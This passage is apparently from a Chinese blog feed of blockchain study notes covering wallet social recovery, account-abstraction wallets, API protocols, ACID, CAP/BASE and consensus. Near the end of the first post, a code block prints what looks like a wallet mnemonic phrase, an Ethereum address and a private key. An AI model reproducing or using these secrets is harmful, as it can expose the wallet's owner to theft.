alt="protector"></p><p>在守护者恢复机制中，用户可以指定一组<strong>信任</strong>的联系人（<strong>守护者</strong>），他们可以在用户<strong>丢失</strong>私钥时帮助恢复钱包。这个过程通常涉及以下步骤：</p><ol><li><strong>设置守护者</strong>：用户在钱包中设置<strong>一组</strong>信任的联系人（守护者），通常需要他们的<strong>公钥</strong>或钱包地址。</li><li><strong>私钥丢失</strong>：当用户<strong>丢失</strong>了对钱包的访问权限，例如<strong>忘记</strong>了密码或<strong>丢失</strong>了硬件钱包。</li><li><strong>请求恢复</strong>：用户向守护者发出<strong>帮助恢复</strong>的请求。</li><li><strong>多签名交易</strong>：守护者<strong>们</strong>需要按照预设的规则（例如，需要一定数量的守护者同意）签署一个特殊的多签名交易，以<strong>证明</strong>他们的身份和同意恢复操作。</li><li><strong>恢复钱包</strong>：一旦收集到<strong>足够</strong>数量的签名，就可以通过智能合约或其他机制来恢复钱包的访问权限。</li></ol><h2 id="10-2-密钥分片恢复"><a href="#10-2-密钥分片恢复" class="headerlink" title="10-2. 密钥分片恢复"></a>10-2. 密钥分片恢复</h2><p>密钥分片社交恢复钱包是使用<strong>门限秘密</strong>共享的密码学技术方案对钱包的助记词或私钥进行切片备份管理，当用户的助记词或私钥丢失，可以发起社交恢复的方式进行助记词和私钥的恢复，在密钥分片社交恢复钱包中，可以将助记词和私钥屏蔽，不在需要用户自己去备份助记词和私钥，而是通过社交的方式进行助记词和私钥的备份。</p><blockquote><p>门限秘密（Threshold Secret）是一种密码学技术，用于将秘密信息分割成多个部分，并指定一个门限值。只有达到或超过门限值的部分才能合并，从而重新构建原始的秘密信息。前面的MPC和多签都算是门限秘密</p></blockquote><p><img src="/img/web3/Threshold.png" alt="Threshold"></p><p>在密钥分片钱包中，我们整个社交恢复的流程如下：</p><ul><li>用户的私钥或者助记词和一个大随机数做一次异或算法（异或算法是一种逻辑运算，两个比对，如果相同就返回0，否则返回1），得到一个新的秘密值，我们把大随机数叫做 head, 秘密值叫做 body，head 加密之后上传到 savour wallet 云端（平台）。</li><li>将 body 做门限共享秘密算法（前面说的共享），拆分成 N 份 shadow（翻译过来是’影’的意思）, 设置 K 份可以恢复 body</li><li>shadow-1 加密之后存储在本地，使用 AES 加密，密码Hash之后做为加密 Key，</li><li>shadow-2 加密之后存储到savour wallet 云端，使用 AES 加密，密码和设备 ID 做为加密 Key</li><li>shadow-3 … n 加密之后存储到密钥柜和社交圈的好友，反正就是各种存储</li><li>助记词或者私钥丢失发起恢复，获取密钥柜里面或者好友处的 k - 2 份私钥，再获取云端的 shadow-2 和 header。</li><li>逆门限共享秘密算法通过 K 份 shadow 恢复出 body</li><li>body 和 head 做逆异或算法得到助记词和私钥。 关于密钥柜： 密码柜是一个密钥托管服务，用户可以自行运行密钥柜服务存储自己的密钥 shadow，也可以将密钥 shadow 加密之后保存到我们官方密钥柜，密钥柜对接的是各大区块链存储平台，我们将把密钥进行深层次加密之后把密钥上传到各大区块链存储平台，即使有一天密钥柜不运行了，用户也可以从各大区块链存储平台获取到自己加密的密钥分片，根据加密规则进行解密就可以得到明文的密钥 shadow，同时根据上面的设计图用户还可以通过隐私社交的方式备份自己的密钥 shadow</li></ul><p>私钥分片恢复机制则是一种基于秘密<strong>共享</strong>算法的方法，它将私钥<strong>分割</strong>成多个部分（分片），并将这些分片<strong>分散存储</strong>在不同的地点或人那里。以下是私钥分片恢复的一般步骤：</p><ol><li><strong>私钥分片</strong>：用户的私钥被<strong>分割</strong>成多个分片，每个分片都通过<strong>某种加密</strong>方法进行<strong>保</strong>护。</li><li><strong>分片存储</strong>：这些分片可以存储在用户的多个设备上、云端服务、或者交给<strong>信任</strong>的朋友保管。</li><li><strong>分片恢复</strong>：当用户需要恢复私钥时，他们<strong>需要收集一定数量</strong>的分片（根据设定的阈值，例如5个分片中的3个）。</li><li><strong>重组私钥</strong>：收集到<strong>足够</strong>的分片后，用户可以通过一个解密过程重组原始的私钥。</li><li><strong>访问钱包</strong>：一旦私钥被<strong>重组</strong>，用户就可以重新访问他们的钱包。</li></ol><h1 id="11-EVM-链-AA-钱包"><a href="#11-EVM-链-AA-钱包" class="headerlink" title="11. EVM 链 AA 钱包"></a>11. EVM 链 AA 钱包</h1><p>EIP4337 账户抽象钱包不仅仅是普通的钱包，它们本身就是智能合约, 主要有安全性高，gas 代付等特点，目前很多公司和项目方都已经或者正在集成账户抽象钱包，但是 AA 钱包目前不是一个很好的赛道，实际应用的公司并不多。—–EVM链AA钱包可以理解为就是只能合约钱包</p><h2 id="11-1-核心特点"><a href="#11-1-核心特点" class="headerlink" title="11.1 核心特点"></a>11.1 核心特点</h2><ol><li><strong>智能合约钱包</strong>：AA钱包本身就是部署在区块链上的<strong>智能合约</strong>。</li><li><strong>内置安全性</strong>：通过智能合约的代码可以实施复杂的安全策略。</li><li><strong>Gas代付</strong>：允许用户在执行交易时由第三方代付<strong>Gas费用</strong>。</li></ol><h2 id="11-2-架构和工作原理"><a href="#11-2-架构和工作原理" class="headerlink" title="11.2 架构和工作原理"></a>11.2 架构和工作原理</h2><ol><li><strong>账户抽象</strong>：与传统钱包不同，AA钱包将账户和交易的发送者<strong>抽象</strong>化，允许更<strong>灵活</strong>的交易发起和签名方式。</li><li><strong>交易构造</strong>：交易的构造可以在链上完成，用户或第三方可以代表AA钱包构造交易。</li><li><strong>签名机制</strong>：AA钱包可以使用<strong>多种签名</strong>机制，包括但不限于传统的ECDSA签名。</li></ol><h2 id="11-3-主要功能"><a href="#11-3-主要功能" class="headerlink" title="11.3 主要功能"></a>11.3 主要功能</h2><ol><li><strong>代付交易</strong>：支持Gas<strong>代付</strong>功能，允许第三方支付交易费用。</li><li><strong>自定义交易</strong>：用户可以自定义交易属性，如nonce、gas限制等。</li><li><strong>多签交易</strong>：可以集成<strong>多签名</strong>机制，提高交易的安全性。</li><li><strong>智能合约交互</strong>：作为智能合约，AA钱包<strong>可以与其他智能合约</strong>进行交互。</li></ol><h2 id="11-4-操作流程"><a href="#11-4-操作流程" class="headerlink" title="11.4 操作流程"></a>11.4 操作流程</h2><ol><li><strong>部署钱包</strong>：在以太坊链上部署AA钱包智能合约。</li><li><strong>资金存入</strong>：用户将资金存入AA钱包合约地址。</li><li><strong>交易构造</strong>：用户或第三方构造交易，包括确定接收者、金额和数据。</li><li><strong>交易签名</strong>：根据AA钱包的配置，可能需要用户或其他参与方的签名。</li><li><strong>交易执行</strong>：将构造好的交易发送到区块链网络，由网络中的节点验证和执行。</li></ol><h2 id="11-5-安全性"><a href="#11-5-安全性" class="headerlink" title="11.5 安全性"></a>11.5 安全性</h2><ol><li><strong>智能合约安全</strong>：安全性依赖于智能合约代码的<strong>健壮性</strong>，需要经过严格的安全审计。</li><li><strong>多签支持</strong>：如果集成多签名机制，可以增加交易的安全性。</li><li><strong>自定义安全策略</strong>：可以通过智能合约实现自定义的安全策略和检查。</li></ol><h2 id="11-6-用户体验"><a href="#11-6-用户体验" class="headerlink" title="11.6 用户体验"></a>11.6 用户体验</h2><ol><li><strong>灵活性</strong>：提供了高度灵活的交易构造和签名方式。</li><li><strong>降低成本</strong>：通过Gas代付功能，可以降低用户的交易成本。</li><li><strong>复杂性</strong>：相比于传统钱包，AA钱包的设置和使用可能更复杂。</li></ol><h2 id="11-7-优势与劣势"><a href="#11-7-优势与劣势" class="headerlink" title="11.7 优势与劣势"></a>11.7 优势与劣势</h2><ul><li><strong>优势</strong>：提供更高的安全性；支持Gas代付；允许灵活的交易构造和签名方式。</li><li><strong>劣势</strong>：需要用户理解智能合约的概念；可能存在智能合约安全风险。</li></ul><p>AA 钱包和  gnosis safe 多签钱包一样，很多都是智能合约，故而我也在智能合约章节中仔细讲解它， 这里不在做过多的赘述。</p><p>如果有兴趣，更多详情可以参阅：</p><p><a href="https://eips.ethereum.org/EIPS/eip-4337">https://eips.ethereum.org/EIPS/eip-4337</a></p><h1 id="12总结"><a href="#12总结" class="headerlink" title="12总结"></a>12总结</h1><p>对于钱包来说，大家需要更好的掌握<strong>交易所钱包</strong>，<strong>去中心化钱包</strong>，<strong>硬件钱包</strong>和 <strong>MPC 托管钱包</strong>，目前这四种钱包<code>应用最广泛</code>，<code>工作岗位最多</code>。关于 gnosis safe 多签钱包,  AA 钱包等，<strong>了解</strong>即可以，需要使用的时候再学习就行了。话虽然这样说，但是关于 gnosis safe 多签钱包和 AA 钱包，我们在智能合约阶段的课程中也会给大家详细讲解。</p><p>值得一说的是，整个钱包课程使用总-分-总的形势铺开，先整体理解钱包的类别，架构以及各模块的实现逻辑，然后再深入讲解钱包的知识细节，最后通过项目实战的形势收回到这篇文章。当然，整个钱包课程也是根据这篇文章展开的，这篇文章的内容也是我们钱包课程第一节课的内容，希望大家有时间好好阅读，深入体会。</p><h1 id="13-拓展【与web3无关】"><a href="#13-拓展【与web3无关】" class="headerlink" title="13 拓展【与web3无关】"></a>13 拓展【与web3无关】</h1><p>原则上业务层就是交易所与用户相关的业务，</p><p>钱包层和业务层之间有通知业务，有统一的通知API，通讯用gRPC</p><p>RestAPI、gRPC、RPC、webSocketAPI、GraphQL该怎么选用？</p><p>RestAPI：就是微服务比较常用那一套</p><p>为什么内部系统用gRPC通讯？–&gt; 快且安全</p><p>当涉及到不同的通信协议和API，以下是对每种通信方式的简要介绍：</p><ol><li>REST API（Representational State Transfer API）：<ul><li>这个比较多了，微服务的哪套就是，请求响应之类的</li><li>REST API 是一种基于 HTTP 协议的通信方式，用于在客户端和服务器之间传输数据。</li><li>客户端通过发送不同的 HTTP 方法（如 GET、POST、PUT、DELETE）请求来操作和获取资源。</li><li>REST API 使用统一的资源标识符（URL）来表示不同的资源，并使用 HTTP 状态码来表示操作结果。</li></ul></li><li>gRPC：<ul><li>gRPC 是一种高性能的远程过程调用（RPC）框架，使用 Protocol Buffers（protobuf）作为接口定义语言（IDL）和数据序列化机制。</li><li>gRPC 支持多种编程语言，并使用基于 HTTP&#x2F;2 的传输协议，提供了双向流式通信、流式传输和高效的序列化。</li><li>它可以用于构建分布式系统，以便不同的服务之间进行跨网络的通信和调用。</li></ul></li><li>RPC（Remote Procedure Call）：<ul><li>RPC 是一种通信协议，用于实现不同计算机节点之间的远程过程调用。</li><li>客户端通过调用远程的过程（函数）来请求执行特定的操作，然后从远程服务端获取结果。</li><li>RPC 提供了一种透明的远程调用机制，使得开发者可以像调用本地函数一样调用远程函数。</li></ul></li><li>WebSocket API：<ul><li>建立连接之后，会一直通讯，比如说K线图，就一直在接收数据</li><li>WebSocket 是一种在单个 TCP 连接上实现全双工通信的协议。</li><li>WebSocket API 允许客户端和服务器之间建立持久性的连接，实现实时数据传输和双向通信。</li><li>客户端和服务器可以通过 WebSocket 连接进行实时的消息传递，不需要每次请求都建立新的连接。</li></ul></li><li>GraphQL：<ul><li>GraphQL 是一种用于构建 API 的查询语言和运行时。 </li><li>客户端可以通过定义自己所需的查询结构来精确获取数据，避免了过度获取或多次请求的问题。</li><li>GraphQL 提供了强类型的数据验证和客户端驱动的数据获取方式，使得客户端可以更灵活地获取数据。</li></ul></li></ol><p>这些通信方式在不同的应用场景中有各自的优势和适用性。选择合适的通信方式取决于系统需求、性能要求、数据传输方式等因素。</p><p>有状态（Stateful）和无状态（Stateless）是与计算机系统或应用程序的状态管理相关的概念。</p><p>有状态（Stateful）指的是系统或应用程序在处理请求或交互时，会记录和保存相关的状态信息。这意味着系统在不同的请求之间会保留并使用之前的状态数据。有状态系统会维护一个会话状态，以便跟踪用户的操作和数据。例如，传统的 Web 应用程序通常使用会话来跟踪用户登录状态和购物车内容。webSocket就是有状态的通讯</p><p>无状态（Stateless）指的是系统或应用程序在处理请求或交互时，不会存储任何相关的状态信息。每个请求都是独立的，服务器不会保持客户端的状态信息。服务器仅根据每个请求的数据进行处理，并返回相应的结果。无状态系统更加简单和可伸缩，因为它们不需要维护和同步状态信息。例如，REST API 是一种无状态的通信方式，每个请求都包含足够的信息来进行处理，服务器不需要保持客户端的状态。gRPC和REST API就是无状态的通讯</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">boil basket mountain fruit tissue burst april legal increase spice original apple<br><br><span class="hljs-number">0xa3856a939A623EdBde8f908037d3F33FceBC5408</span><br>c535facd6873ca2b3718e3ede4f626ae126c99b4a26b4354da704d8dc78b43c1<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>blockChain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>block</tag>
      
      <tag>概念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>02 探讨事务一致性</title>
    <link href="/2024/05/18/02%E6%8E%A2%E8%AE%A8%E4%BA%8B%E5%8A%A1%E4%B8%80%E8%87%B4%E6%80%A7/"/>
    <url>/2024/05/18/02%E6%8E%A2%E8%AE%A8%E4%BA%8B%E5%8A%A1%E4%B8%80%E8%87%B4%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="1-事务的ACID特性"><a href="#1-事务的ACID特性" class="headerlink" title="1.事务的ACID特性"></a>1.事务的ACID特性</h2><p>在数据库中，“事务”是由多个操作构成的序列。广义上的事务一致性具化到了原子性、一致性、隔离性和持久性这4个方面。</p><ol><li><code>原子性（Atomicity）：</code>指事务是一个不可分割的操作单元，要么全部执行成功，要么全部失败回滚。如果事务中的任何一个操作失败，整个事务将回滚到最初的状态。</li><li><code>一致性（Consistency）：</code>指事务将数据库从一个一致状态转变为另一个一致状态。在事务开始和结束时，数据库必须满足预定义的一致性规则，以保持数据的有效性和完整性。</li><li><code>隔离性（Isolation）：</code>指每个事务的执行应该与其他事务的执行相互隔离，以防止彼此干扰。隔离级别定义了事务之间的隔离程度，包括已提交读、可重复读、快照隔离和可串行化。</li><li><code>持久性（Durability）：</code>指一旦事务提交，其结果就应该永久保存在数据库中，即使系统发生故障也不会丢失。数据库通过将事务日志持久化到磁盘来实现持久性。</li></ol><h3 id="1-1-原子性和一致性的差异"><a href="#1-1-原子性和一致性的差异" class="headerlink" title="1.1 原子性和一致性的差异"></a>1.1 原子性和一致性的差异</h3><p><code>原子性</code>关注事务内部状态，要不全部成功，要不全部失败</p><p><code>一致性</code>关注数据可见性，中间状态的数据对外不可见，只有最初状态和最终状态的数据对外可见</p><h3 id="1-2-持久性核心思想即应对系统故障"><a href="#1-2-持久性核心思想即应对系统故障" class="headerlink" title="1.2 持久性核心思想即应对系统故障"></a>1.2 持久性核心思想即应对系统故障</h3><blockquote><p>目的都是保证在本地节点之外，至少有一份完整的日志可用于数据恢复。</p></blockquote><p><strong>存储硬件无损、可恢复故障：</strong> 主要依托于预写日志（Write Ahead Log, WAL）保证第一时间存储数据。WAL采用顺序写入的方式，可以保证数据库的低延时响应。</p><p><strong>存储硬件损坏、不可恢复的故障：</strong> 需要用到日志复制技术，将本地日志及时同步到其他节点。</p><ul><li>单体数据库自带的同步或半同步的方式，其中半同步方式具有一定的容错能力</li><li>日志存储到共享存储系统上，后者会通过冗余存储保证日志的安全性</li><li>基于Paxos&#x2F;Raft的共识算法同步日志数据，在分布式数据库中被广泛使用</li></ul><h3 id="1-3-隔离性分为多个隔离级别"><a href="#1-3-隔离性分为多个隔离级别" class="headerlink" title="1.3 隔离性分为多个隔离级别"></a>1.3 隔离性分为多个隔离级别</h3><blockquote><p>较低的隔离级别就是在正确性上做妥协，将一些异常现象交给应用系统的开发人员去解决，从而获得更好的性能。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>blockChain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>block</tag>
      
      <tag>概念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>01 分布式基础理论</title>
    <link href="/2024/05/17/01%E5%88%86%E5%B8%83%E5%BC%8F%E5%9F%BA%E7%A1%80%E7%90%86%E8%AE%BA/"/>
    <url>/2024/05/17/01%E5%88%86%E5%B8%83%E5%BC%8F%E5%9F%BA%E7%A1%80%E7%90%86%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="1-分布式理论基础"><a href="#1-分布式理论基础" class="headerlink" title="1.分布式理论基础"></a>1.分布式理论基础</h1><h2 id="1-1-CAP理论是分布式系统的基石"><a href="#1-1-CAP理论是分布式系统的基石" class="headerlink" title="1.1 CAP理论是分布式系统的基石"></a>1.1 CAP理论是分布式系统的基石</h2><h3 id="Consistency-一致性"><a href="#Consistency-一致性" class="headerlink" title="Consistency(一致性):"></a>Consistency(一致性):</h3><p>“all nodes see the same data at the same time”，即更新操作成功并返回客户端，所有节点在同一时间的数据完全一致，一致性的问题在并发系统中不可避免。（所有的节点在同一时刻看到的数据是相同的）</p><p>对于客户端，一致性指的是并发访问时更新过的数据如何获取</p><p>对于服务端，则是更新如何复制分布到整个系统，以保证数据一致。</p><h3 id="Availability-可用性"><a href="#Availability-可用性" class="headerlink" title="Availability (可用性):"></a>Availability (可用性):</h3><p>“Reads and writes always succeed”，即服务一直可用，而且是正常响应时间。良好的可用性是指系统能够很好的为用户服务，不出现用户操作失败或者访问超时等用户体验不好的情况。（可用嘛，就是总是能成功）</p><h3 id="Partition-Tolerance-分区容错性"><a href="#Partition-Tolerance-分区容错性" class="headerlink" title="Partition Tolerance (分区容错性):"></a><strong>Partition Tolerance (分区容错性):</strong></h3><p>即分布式系统在遇到某节点或网络分区故障的时候，仍然能够对外提供满足一致性和可用性的服务。</p><p>比如现在的分布式系统中有某一个或者几个机器宕掉了，其他剩下的机器还能够正常运转满足系统需求，对于用户而言并没有什么体验上的影响，（别人出问题了跟你不影响）</p><h3 id="1-2-三者只能取其二"><a href="#1-2-三者只能取其二" class="headerlink" title="1.2 三者只能取其二"></a>1.2 三者只能取其二</h3><ul><li><strong>CA without P：</strong> 如果不要求P（不允许分区），则保留C（强一致性）和A（可用性），但放弃P的同时也就意味着放弃了系统的扩展性，也就是分布式节点受限，这是有违背分布式系统的设计初衷。</li><li><strong>CP without A：</strong> 如果不要求A（可用），强调各服务之间数据<code>强一致性</code>，而P（分区）会导致同步时间无限延长(等待数据同步完才能正常访问服务)，一旦发生网络故障或者消息丢失等情况，就要牺牲用户的体验。</li><li><strong>AP wihtout C：</strong> 要高可用并允许分区，则需放弃一致性。一旦分区发生，节点之间可能会失去联系，为了高可用，每个节点只能用本地数据提供服务，这样会导致全局数据的不一致性。</li></ul><p>没有完美的分布式，要看你为了什么而去牺牲什么？你要分区那可能会造成数据不一致的可能性，你要你要强一致和高可用，那就要牺牲分区的高拓展性。没有完美的系统，</p><h3 id="1-3-BASE理论（一种妥协）"><a href="#1-3-BASE理论（一种妥协）" class="headerlink" title="1.3 BASE理论（一种妥协）"></a>1.3 BASE理论（一种妥协）</h3><p>BASE是Basically Available（基本可用）、Soft state（软状态）和 Eventually consistent（最终一致性）三个短语的缩写</p><p>BASE是对CAP中一致性和可用性权衡的结果，核心思想是：<strong>即使无法做到强一致性，采用适当的方式使系统达到最终一致性</strong>。</p><p><strong>Basically Available:</strong> <strong>基本可用</strong>是指分布式系统在出现不可预知故障的时候，<strong>允许损失</strong>部分可用性，但不等价于系统不可用。系统最终是可用的</p><ul><li><strong>秒杀</strong>的场景下用户数量暴增，为保护系统稳定性，有部分用户可能被引导至一个降级页面</li></ul><p><strong>Soft state:</strong> 允许系统中的数据存在中间状态，并认为中间状态不会影响系统整体可用性，即允许系统在不用节点之间数据同步存在延时（加中间状态，比如说支付中）举个例子：农业银行向工商银行转账，会有一个5秒左右延迟到账，这就是中间状态。</p><p><strong>Eventually consistent:</strong> 强调所有的数据副本在经过一段时间同步后，最终能够达成一致的状态。最终保证一致，而不是实时保证系统一致性。</p><p>BASE理论面向的是大型高可用可扩展的分布式系统，和传统的事物ACID特性是相反的，它完全不同于ACID的强一致性模型，而是通过牺牲强一致性来获得可用性，并允许数据在一段时间内是不一致的，但最终达到一致状态。但同时，在实际的分布式场景中，不同业务单元和组件对数据一致性的要求是不同的，因此在具体的分布式系统架构设计过程中，ACID特性和BASE理论往往又会结合在一起。</p><h2 id="2-区块链不可能三角"><a href="#2-区块链不可能三角" class="headerlink" title="2.区块链不可能三角"></a>2.区块链不可能三角</h2><p>区块链通常在<code>安全性</code>、<code>去中心化</code>和<code>可扩展性</code>之间进行权衡：</p><ul><li>比特币：重点放在<code>安全性</code>和<code>去中心化</code>上，因此导致比特币的<code>可扩展性</code>受限，因为比特币的区块大小和区块时间设定限制了它的交易处理能力。在需求高的时候就会导致交易延迟和手续费上涨（假如一个区块时间是5秒，在这个区块时间内它的交易处理能力是有限的，太多交易要处理的时候，就会影响其处理时间，和手续费上涨）。</li><li>以太坊：重点也放在<code>安全性</code>和<code>去中心化</code>上，并作为智能合约平台，它需要确保用户的资产和协议是安全的。因此以太坊的<code>可扩展性</code>较差，尤其当DeFi和NFT的应用量增大时，交易延迟与费用上涨的问题尤其突出。</li><li>Solana：主要关注<code>可扩展性</code>因此在处理速度和吞吐量上都非常高效，为了达到这样的性能，在网络的中心化程度作出了一些妥协，例如限制验证者的数量。</li></ul><h2 id="3-概率最终性和逐块最终性"><a href="#3-概率最终性和逐块最终性" class="headerlink" title="3.概率最终性和逐块最终性"></a>3.概率最终性和逐块最终性</h2><p><code>概率最终性：</code>在比特币网络中，由于采用了Proof-of-Work（工作量证明）的共识算法。尽管一个区块被添加到区块链上，但仍然存在一定的概率（尽管很小）在后续的区块中被另一个竞争者的区块所取代。因此，对于比特币网络来说，一个最新的区块在一段时间后可以被认为具有<code>概率最终性</code>，即随着更多的区块被添加到区块链上，该区块被替代的概率会逐渐减小。</p><p><code>逐块最终性：</code>对于Cosmos网络，它采用了Tendermint共识算法，该算法通过验证人的投票来确定下一个区块的生成者。一旦在Cosmos网络中的一个区块被验证人成功生成并广播出去，它被认为是最终的结果，不会被后续的区块替代。因此，可以说Cosmos网络具有逐块最终性，即一旦一个区块在网络中被验证人确认，它就成为最终的结果。</p>]]></content>
    
    
    <categories>
      
      <category>blockChain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>block</tag>
      
      <tag>概念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>00 区块链基础知识</title>
    <link href="/2024/05/16/00%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2024/05/16/00%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<blockquote><p>对于一些词汇概念的讲解</p></blockquote><h1 id="1-什么是区块链？"><a href="#1-什么是区块链？" class="headerlink" title="1. 什么是区块链？"></a>1. 什么是区块链？</h1><p>区块链是一种<code>分布式</code>的、去<code>中心化</code>的数字账本技术，用于记录和验证交易的数据。</p><p>区块链的核心概念是将交易的数据记录在一个被称为“区块”的数据结构中，</p><p>并通过<code>加密</code>和<code>共识算法</code>保证数据的<code>安全性</code>和 <code>一致性</code></p><p>每个区块包含了一批交易的信息，以及与之前区块的链接，形成了一个链式结构</p><blockquote><p>链：串起来了才是链</p></blockquote><h1 id="2-区块链有什么特点？"><a href="#2-区块链有什么特点？" class="headerlink" title="2. 区块链有什么特点？"></a>2. 区块链有什么特点？</h1><p>在区块链中，参与者通过网络共享和维护这个账本的副本，而不是依赖于中央机构来验证交易。这种去中心化的特性使得区块链具有以下特点：</p><ol><li><code>透明性</code>：区块链中的交易和数据是公开可见的，任何人都可以查看账本的副本。这提供了一种透明的方式来验证交易和监督系统的运作。</li><li><code>安全性</code>：区块链使用密码学技术对数据进行加密和验证，从而确保数据的安全性和完整性。由于数据存储在多个节点上，篡改数据变得非常困难。</li><li><code>去中心化</code>：区块链没有中央机构或控制权，参与者通过共识算法来达成对账本的一致认可。这使得区块链具有更高的可信度和抗攻击能力。</li><li><code>不可篡改性</code>：一旦数据被记录在区块链上，由于每个区块都包含了前一个区块的哈希值，任何对数据的篡改都将被其他节点检测到。</li></ol><h2 id="3-区块链的运作方式"><a href="#3-区块链的运作方式" class="headerlink" title="3.区块链的运作方式"></a>3.区块链的运作方式</h2><h3 id="3-1-哈希函数"><a href="#3-1-哈希函数" class="headerlink" title="3.1 哈希函数"></a>3.1 哈希函数</h3><p>理想的加密哈希函数具备5个主要属性：</p><ol><li><strong>确定性：</strong>相同的消息总是产生相同的哈希值。</li><li><strong>快速：</strong>快速计算任何给定消息的哈希值。</li><li><strong>抵抗性：</strong>除非尝试所有可能的消息，否则从其哈希值生成消息是不可行的。—无法返解</li><li><strong>不相关：</strong>对消息的微小更改会极大地改变哈希值，以至于新值与旧值没有关系。–原始消息改1个字哈希大改</li><li><strong>抗碰撞：</strong>不可能找到具有相同哈希值的两个不同消息。—每一个都是唯一的</li></ol><h3 id="3-2-区块、链"><a href="#3-2-区块、链" class="headerlink" title="3.2 区块、链"></a>3.2 区块、链</h3><ul><li>有效区块是一组有序的<strong>交易</strong>。</li><li>每个块都包含前一个块的<strong>哈希值。</strong>—按顺序排的</li><li>区块的哈希值具有<strong>易证明难伪造。</strong></li></ul><p><img src="/img/chain/image-03.png" alt="image1"></p><h2 id="4-交易的运作方式"><a href="#4-交易的运作方式" class="headerlink" title="4.交易的运作方式"></a>4.交易的运作方式</h2><h3 id="4-1-加密钱包"><a href="#4-1-加密钱包" class="headerlink" title="4.1 加密钱包"></a>4.1 加密钱包</h3><blockquote><p>钱包并不存储加密资产，他们只存储私钥</p></blockquote><p>先理解三个重要概念：</p><ul><li>私钥、公钥、地址：公私钥通过<code>非对称加密</code>生成，公钥用于分发，私钥用于个人保留，地址通过公钥推导</li><li>加密与解密：消息传递通过公钥加密、私钥解密</li><li>签名与验证：交易信息通过私钥签名、公钥验证签名</li></ul><p><img src="/img/chain/image-0401.png" alt="image-0401"></p><h3 id="4-2-以BTC为例，讲解一笔交易流程"><a href="#4-2-以BTC为例，讲解一笔交易流程" class="headerlink" title="4.2 以BTC为例，讲解一笔交易流程"></a>4.2 以BTC为例，讲解一笔交易流程</h3><blockquote><p>用户B转账 1 bitcoin 到用户 A</p></blockquote><p><img src="/img/chain/image-0402.png" alt="image-0402"></p><ol><li>用户B使用自己的私钥签名完成交易信息【确认用户B有足够的代币】</li><li>将交易信息发送至节点，节点使用公钥验证交易信息，并存储在<code>内存池</code>中。</li><li>节点将交易分组在区块中，并广播到其他节点。</li><li>共识成功并出块后，用户A才能获取到1 bitcoin。</li></ol><h2 id="5-共识"><a href="#5-共识" class="headerlink" title="5.共识"></a>5.共识</h2><h3 id="5-1-工作量证明（PoW）"><a href="#5-1-工作量证明（PoW）" class="headerlink" title="5.1 工作量证明（PoW）"></a>5.1 工作量证明（PoW）</h3><blockquote><p>去中心化程度高，消耗资源高<br>在 PoW 共识中，用户必须完成任意难度的任务，当与块中的有序交易结合时，会产生符合特定标准的哈希函数结果。</p></blockquote><ol><li>称为“矿工”的节点通过暴力竞争来解决数学问题（找到特定规则的哈希值）—-大家一起挖呀挖</li><li>第一个解决问题的矿工可以创建一个区块—–第一个挖到了哦</li><li>其他节点检查该块是否有效。如果是，矿工将获得加密货币奖励。如果不是，矿工就浪费了时间和精力。</li><li>所有的节点都将新块添加到其区块链副本中。—-</li></ol><h3 id="5-2-股权证明-PoS"><a href="#5-2-股权证明-PoS" class="headerlink" title="5.2 股权证明 (PoS)"></a>5.2 股权证明 (PoS)</h3><blockquote><p>去中心化的一种妥协方案，更像选择代表人参与网络，相比工作量证明大大降低资源消耗</p></blockquote><ol><li>称为验证者节点会抵押一些加密货币。投入一定数量的加密货币来参与和分配出块奖励。</li><li>验证者节点所占的权重越高更有可能被选择来处理交易并创建区块。</li><li>其他验证者节点检查该块是否有效。如果是，所有参与的验证者都会赚取收益。如果不是，创建该块的验证者可能会失去其权益或者获得惩罚。</li></ol><p>还有其他共识算法将后续介绍，比如：权威证明、委托权益证明等</p><h1 id="延伸：-Cosmos的共识机制是什么？："><a href="#延伸：-Cosmos的共识机制是什么？：" class="headerlink" title="延伸： Cosmos的共识机制是什么？："></a>延伸： Cosmos的共识机制是什么？：</h1><p>Cosmos 是一个开放的区块链生态系统，它采用了一种具有扩展性和互联性的共识机制，称为 <strong>Tendermint</strong> 共识。</p><p><strong>Tendermint</strong> 共识是一种基于<strong>权益证明</strong>（Proof-of-Stake, PoS）的共识算法。它的设计目标是实现高吞吐量、快速确认和良好的安全性。以下是 Tendermint 共识的主要特点：</p><ol><li>权益证明（Proof-of-Stake）：Tendermint 使用权益证明作为共识机制，参与共识的节点需要锁定一定数量的代币作为权益。这些权益代币用于确定节点在共识过程中的投票权重。</li><li>BFT 共识算法：Tendermint 基于拜占庭容错（Byzantine Fault Tolerance, BFT）算法实现共识。它使用了一种称为 “Tendermint Core” 的共识引擎，该引擎通过节点之间的相互通信来达成共识。</li><li>轮次制（Round-Robin）：在 Tendermint 中，节点按照轮次制进行共识过程。每个轮次中，一个节点被选为提议者（Proposer），负责提议一个区块。其他节点将根据提议者的区块进行投票，达成共识。每个轮次后，提议者会轮换到下一个节点。</li><li>快速最终性（Fast Finality）：Tendermint 具有快速最终性的特点，一旦一个区块被大多数节点确认，它就被视为最终的并且不可逆的。这意味着确认的区块在整个网络中被广泛接受，提高了交易的安全性和确定性。</li></ol><p>Tendermint 共识机制在 Cosmos 生态系统中被用于连接多个独立的区块链（称为 “区块链间通信”，Inter-Blockchain Communication, IBC），实现跨链互操作性。它提供了一个安全且高效的共识算法，使得 Cosmos 网络中的不同区块链能够进行可靠的交互和数据传输。</p><h1 id="区块链基础："><a href="#区块链基础：" class="headerlink" title="区块链基础："></a>区块链基础：</h1><p>密码学、分布式存储、智能合约、共识算法</p><h2 id="区块"><a href="#区块" class="headerlink" 